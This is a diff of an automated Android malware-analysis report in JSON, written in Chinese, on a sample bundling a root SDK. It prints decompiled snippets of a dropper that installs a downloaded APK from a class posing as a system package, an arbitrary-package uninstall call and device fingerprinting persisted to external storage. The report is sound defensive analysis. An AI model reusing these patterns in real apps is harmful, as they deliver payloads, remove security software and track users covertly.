+          "behavior_description": "该代码位于 RootGenius（Shuame 提权SDK）内部，是提权引擎的配置解析器，而非单纯的 Root 检测。它通过 XmlPullParser 解析包含 solution（Root 提权漏洞利用方案列表）、superuser（提权成功后需安装的超级用户管理应用配置）、product_id、neo 等节点的 XML 配置字符串，并将解析结果装配到 gVar 对象中，供后续提权引擎调用执行。数据流向：远程服务器下发或内置的 XML 提权配置字符串（source）→ 解析出提权方案集合与 superuser 安装信息 → 驱动 SDK 对设备执行提权/静默 Root（sink）。在已确认恶意的样本中，该能力使木马可获得系统级权限，用于深度驻留、静默安装和隐蔽自身，属于提权类恶意行为链的关键组成部分。",
           "glm_analyzed": true
         }
       ]
@@ -319,14 +348,55 @@
       ],
       "恶意代码": [
         {
+          "class_path": "Lcom\\android\\a\\a\\a;",
+          "method_signature": "a(Context context, String str)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private static void a(Context context, String str) {\n    String strA = d.a(str);\n    Intent intent = new Intent();\n    intent.addFlags(805306368);\n    intent.setAction(\"android.intent.action.VIEW\");\n    intent.setDataAndType(Uri.fromFile(new File(strA)), \"application/vnd.android.package-archive\");\n    context.startActivity(intent);\n}",
+          "malicious_code_snippet_context": "          void b(String str, String str2);\n      }\n  \n>>>     private static void a(Context context, String str) {\n>>>         String strA = d.a(str);\n>>>         Intent intent = new Intent();\n>>>         intent.addFlags(805306368);\n>>>         intent.setAction(\"android.intent.action.VIEW\");\n>>>         intent.setDataAndType(Uri.fromFile(new File(strA)), \"application/vnd.android.package-archive\");\n>>>         context.startActivity(intent);\n>>>     }\n  \n      public static void a(Context context, String str, InterfaceC0000a interfaceC0000a) {\n          a(context, str, com.android.app.a.down, interfaceC0000a);",
+          "behavior_description": "该代码位于高度混淆的类 com.android.a.a.a 中（刻意伪装成 Android 系统包名以规避检测），且与下载回调接口（InterfaceC0000a，含下载进度/完成回调）配合，构成典型的释放器（dropper）链路：外部传入的 APK 文件路径参数 str 经 d.a() 解析为本地存储路径后，构造 ACTION_VIEW Intent 并指定 MIME 类型 application/vnd.android.package-archive，调起系统包安装器安装该本地 APK。数据流向为：下载到本地的 APK 文件路径（参数 str）→ d.a() 路径解析 → Uri.fromFile 封装 → startActivity 触发系统安装器。虽然该方式会弹出系统安装确认界面（并非完全静默安装，需用户点击确认），但在已确认恶意的样本中，此机制被用于投放并诱导用户安装二次恶意载荷，属于恶意释放/安装行为。",
+          "glm_analyzed": true
+        },
+        {
           "class_path": "Lcom\\shuame\\rootgenius\\sdk\\f;",
           "method_signature": "c(String str)",
           "malicious_behavior": "silent_install_uninstall",
           "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "public static int c(String str) {\n    d().startActivity(new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + str)));\n    return 0;\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static int c(String str) {\n>>>         d().startActivity(new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + str)));\n>>>         return 0;\n>>>     }\n  \n      private static Context d() {\n          if (e != null) {",
+          "behavior_description": "该方法接收外部传入的包名参数 str，通过保存的 Context（WeakReference 获取）构造 ACTION_DELETE 系统卸载 Intent（Uri 为 package:目标包名），并调用 startActivity 触发对指定应用的卸载流程。数据流向：调用方传入的任意包名 → Intent 构造 → startActivity 触发系统卸载。该代码位于刷机精灵 RootGenius SDK（com.shuame.rootgenius.sdk）中，在已确认恶意的样本上下文中，此类任意包名卸载能力通常被用于卸载竞争对手应用或安全防护软件。虽然 startActivity 方式会弹出系统卸载确认框（非完全静默，需用户点击确认），但在恶意诱导场景下仍可致使用户应用被移除，破坏用户应用环境。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\a\\c\\c;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "grayware",
           "risk_level": "中",
-          "malicious_code_snippet": "d().startActivity(new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + str)));",
-          "malicious_code_snippet_context": "      }\n  \n      public static int c(String str) {\n>>>         d().startActivity(new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + str)));\n          return 0;\n      }\n  ",
-          "behavior_description": "该方法接收一个包名字符串作为参数，构造一个 ACTION_DELETE 类型的 Intent，通过 startActivity 调起系统卸载确认界面，尝试卸载指定包名的应用。该行为并非真正意义上的静默卸载（会弹出系统确认对话框），但在恶意样本上下文中，可能被用于诱导用户卸载安全软件或竞争应用。数据流向：方法参数 str（包名）→ Intent ACTION_DELETE → startActivity 触发系统卸载流程。",
+          "malicious_code_snippet": "private static final String b = Environment.getExternalStorageDirectory().getAbsolutePath() + \"/device\";\npublic static volatile String a = \"\";\npublic static String a() {\n    return Build.MANUFACTURER;\n}\npublic static String a(Context context) {\n    if (a != null && a.length() > 10) {\n        return a;\n    }",
+          "malicious_code_snippet_context": "  \n  /* JADX INFO: loaded from: classes.dex */\n  public class c {\n>>>     private static final String b = Environment.getExternalStorageDirectory().getAbsolutePath() + \"/device\";\n>>>     public static volatile String a = \"\";\n>>> \n>>>     public static String a() {\n>>>         return Build.MANUFACTURER;\n>>>     }\n>>> \n>>>     public static String a(Context context) {\n>>>         if (a != null && a.length() > 10) {\n              return a;\n          }\n          a = com.android.b.a.e.a(context).a(\"device\", \"uid\", \"\");",
+          "behavior_description": "该代码是设备指纹收集工具类：结合 TelephonyManager（获取IMEI设备ID）、Settings.Secure（ANDROID_ID）、Build.MANUFACTURER（厂商信息）及UUID回退机制生成设备唯一标识，并通过 Environment.getExternalStorageDirectory() 将该标识持久化写入外部存储文件 /sdcard/device。数据流向：设备标识符（IMEI/ANDROID_ID/厂商信息）→ 写入外部存储文件（/sdcard/device）。写入外部存储的设备ID在应用卸载重装后依然保留，实现跨卸载的持久化设备追踪，属于过度收集设备隐私并隐蔽持久化的行为，可为恶意样本后续的受害者追踪和数据上报提供指纹基础，但该片段本身未直接外传数据或窃取用户文件。",
           "glm_analyzed": true
         }
       ]
@@ -339,7 +409,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
